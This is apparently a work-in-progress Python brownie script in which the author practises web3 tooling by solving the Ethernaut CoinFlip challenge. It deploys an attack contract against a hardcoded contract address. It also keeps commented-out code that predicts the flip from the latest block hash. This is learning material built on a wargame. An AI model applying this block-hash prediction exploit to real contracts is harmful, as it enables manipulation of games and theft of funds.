"""
This script is a WIP.  I'm using the Ethernaut challenges to try and understand eth-brownie and web3.py better.
These are not as well documented or straightforward of frameworks as Hardhat or Foundry even, but Python has its advantages at times.
"""


# import web3
import brownie.convert
from brownie import network, config, accounts, interface, web3

from scripts.deploy import deploy_attack_coinflip

LOCAL_BLOCKCHAINS = ["development", "ganache-local"]
BLOCKCHAIN_FORKS = ["mainnet-fork", "mainnet-fork-dev"]
TESTNETS = ["goerli", "sepolia"]

# w3 = web3.Web3(web3.HTTPProvider(config["networks"][network.show_active()]["endpoint"]))
# coinflip_abi = [
#     {"inputs": [], "stateMutability": "nonpayable", "type": "constructor"},
#     {
#         "inputs": [],
#         "name": "consecutiveWins",
#         "outputs": [{"internalType": "uint256", "name": "", "type": "uint256"}],
#         "stateMutability": "view",
#         "type": "function",
#     },
#     {
#         "inputs": [{"internalType": "bool", "name": "_guess", "type": "bool"}],
#         "name": "flip",
#         "outputs": [{"internalType": "bool", "name": "", "type": "bool"}],
#         "stateMutability": "nonpayable",
#         "type": "function",
#     },
# ]


def get_account() -> str:
    if (
        network.show_active() in LOCAL_BLOCKCHAINS
        or network.show_active() in BLOCKCHAIN_FORKS
    ):
        return accounts[0]
    elif network.show_active() in TESTNETS:
        return accounts.add(config["networks"][network.show_active()]["wallet"])
    else:
        return accounts.add(config["wallets"]["from_key"])


def main():
    # coinflip = w3.eth.contract(coinflip_address, abi=coinflip_abi)

    coinflip_address = "0x246405399B8F29De85CE4F72bb3Aa47BE427Ec26"

    # coinflip = interface.ICoinFlip(coinflip_address)

    coinflip_attack = deploy_attack_coinflip(coinflip_address)
    coinflip_attack.attack()

    # if (network.show_active() in BLOCKCHAIN_FORKS) or (
    #     network.show_active() in TESTNETS
    # ):
    #     # Arrange
    #     account = get_account()
    #     # print(f"Web3 connected?  {w3.isConnected()}")
    #     last_block = web3.eth.get_block("latest")
    #     last_block_hash = brownie.convert.to_uint(last_block["hash"])

    #     # while wins < 10:
    #     last_block = web3.eth.get_block("latest")
    #     last_block_hash = brownie.convert.to_uint(last_block["hash"])
    #     result_num = (
    #         last_block_hash
    #         // 57896044618658097711785492504343953926634992332820282019728792003956564819968
    #     )
    #     result_bool = result_num == 1
    #     print(coinflip.consecutiveWins({"from": account}))
    #     print(f"Creator: {coinflip.creator}")
    # counter.functions.read().call()
    # txn_hash = counter.functions.increment().transact({"from": me})
    # w3.eth.wait_for_transaction_receipt(txn_hash)
    # tx = coinflip.functions.flip(result_bool).call({"from": account})
    # tx.wait(1)
    # print(coinflip.call().consecutiveWins())


if __name__ == "__main__":
    main()
